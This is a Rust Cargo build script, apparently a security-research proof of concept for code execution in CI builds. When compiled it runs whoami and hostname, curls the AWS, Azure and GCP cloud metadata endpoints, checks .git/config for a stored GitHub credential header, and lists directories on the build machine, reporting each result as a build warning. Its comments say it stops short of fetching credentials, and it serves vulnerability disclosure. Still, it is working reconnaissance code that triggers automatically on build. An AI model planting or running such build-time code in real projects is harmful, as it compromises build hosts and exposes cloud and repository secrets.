fn main() {
    println!("cargo:warning=POC-RCE-Security-Research");
    println!("cargo:warning=whoami={}", cmd_out("whoami"));
    println!("cargo:warning=hostname={}", cmd_out("hostname"));

    // --- Capability proof #1: cloud metadata service reachability ---
    // We ONLY check reachability/vendor identification. We deliberately do NOT
    // fetch IAM role names, ARNs, account IDs, or credentials.
    let aws = cmd_out_str(
        "curl",
        &[
            "-s",
            "-m",
            "2",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            "-X",
            "PUT",
            "http://169.254.169.254/latest/api/token",
            "-H",
            "X-aws-ec2-metadata-token-ttl-seconds: 60",
        ],
    );

    let azure = cmd_out_str(
        "curl",
        &[
            "-s",
            "-m",
            "2",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            "-H",
            "Metadata: true",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ],
    );

    let gcp = cmd_out_str(
        "curl",
        &[
            "-s",
            "-m",
            "2",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            "-H",
            "Metadata-Flavor: Google",
            "http://169.254.169.254/computeMetadata/v1/",
        ],
    );

    println!(
        "cargo:warning=cloud_metadata_http_status aws={} azure={} gcp={}",
        aws, azure, gcp
    );

    // Cheap, network-free corroboration (no IMDS call at all)
    let product =
        std::fs::read_to_string("/sys/class/dmi/id/product_name").unwrap_or_default();
    println!("cargo:warning=dmi_product_name={}", product.trim());

    // --- Capability proof #2: is a real GITHUB_TOKEN persisted to disk here? ---
    // We only report presence/absence of the credential header, we NEVER print
    // its value or use it to call any API.
    let git_config = std::fs::read_to_string(".git/config").unwrap_or_default();
    let has_extraheader =
        git_config.contains("http.https://github.com/.extraheader")
            || git_config.contains("extraheader");

    println!(
        "cargo:warning=git_credential_persisted_to_disk={}",
        has_extraheader
    );

    // --- Capability proof #3: is this a persistent (non-ephemeral) self-hosted box? ---
    // List directory NAMES only (not contents) at a couple of standard locations
    // to show evidence of state surviving across jobs. No file is opened/read.
    for dir in ["/_work", "/home/runner", "/tmp"] {
        if let Ok(entries) = std::fs::read_dir(dir) {
            let names: Vec<String> = entries
                .filter_map(|e| e.ok())
                .map(|e| e.file_name().to_string_lossy().to_string())
                .take(20)
                .collect();

            println!("cargo:warning=dir_listing[{}]={:?}", dir, names);
        }
    }
}

fn cmd_out(bin: &str) -> String {
    std::process::Command::new(bin)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default()
}

fn cmd_out_str(bin: &str, args: &[&str]) -> String {
    std::process::Command::new(bin)
        .args(args)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_else(|_| "ERR".to_string())
}
